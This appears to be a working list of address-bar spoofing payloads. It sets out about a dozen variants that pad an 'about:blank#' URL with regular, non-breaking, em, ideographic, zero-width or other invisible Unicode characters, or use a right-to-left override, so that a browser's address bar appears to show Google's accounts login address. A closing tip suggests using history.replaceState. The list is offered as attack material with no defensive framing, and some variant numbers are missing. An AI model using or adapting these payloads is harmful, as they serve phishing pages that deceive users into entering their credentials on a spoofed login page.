about:blank# Address Bar Spoof Bypasses

V1 — Original (Regular Spaces)
Baseline: about:blank# + 2000 regular spaces + https://accounts.google.com. Pushes "about:blank#" off-screen left.
about:blank#[space x2000]https://accounts.google.com
V2 — Non-Breaking Spaces (U+00A0)
Uses &nbsp; (U+00A0) instead of regular spaces. Some browsers handle these differently in URL bar rendering.
about:blank#[\u00A0 x2000]https://accounts.google.com
V3 — Em Spaces (U+2003)
Uses em space (U+2003) — wider than regular space. Needs fewer characters to push content off-screen.
about:blank#[\u2003 x500]https://accounts.google.com
V4 — Ideographic Spaces (U+3000)
CJK ideographic space — full-width space character. Even wider than em space.
about:blank#[\u3000 x500]https://accounts.google.com
V5 — Tab Characters
Uses tab (\t) characters. Tabs render wider than spaces in some URL bar implementations.
about:blank#[\t x500]https://accounts.google.com
V6 — URL-Encoded Spaces (%20)
Uses %20 encoded spaces. Browser may decode them for display but handle differently than literal spaces.
about:blank#[%20 x800]https://accounts.google.com
V7 — Zero-Width Spaces + Regular Padding
Mix zero-width spaces with regular spaces. ZWS may confuse URL parsing/truncation logic.
about:blank#[\u200B\u0020 x1000]https://accounts.google.com
V8 — RTL Override (U+202E)
Uses Right-to-Left override character. May reverse URL display so "about:blank" appears at the end (off-screen right) and "google.com" appears first.
about:blank#\u202Emoc.elgoog.stnuocca//:sptth
V9 — Newline Characters in Fragment
Injects %0A (newline) and %0D (carriage return) in fragment. May cause address bar to only show content after the newline.

V12 — Mixed Unicode Whitespace Cocktail
Mixes multiple whitespace types: hair space (U+200A), thin space (U+2009), six-per-em (U+2006), figure space (U+2007), punctuation space (U+2008). Different browsers normalize different subsets.
about:blank#[\u200A\u2009\u2006\u2007\u2008 x300]https://accounts.google.com
V13 — Braille Blank Pattern (U+2800)
Braille pattern blank — renders as blank space but is NOT classified as whitespace in Unicode. May bypass whitespace stripping.

V14 — Hangul Filler (U+3164)
Korean Hangul filler character — visually blank, not classified as space. Another whitespace bypass candidate.

Open about:blank, then use history.replaceState inside the new window to change displayed URL. May bypass about: display restrictions.
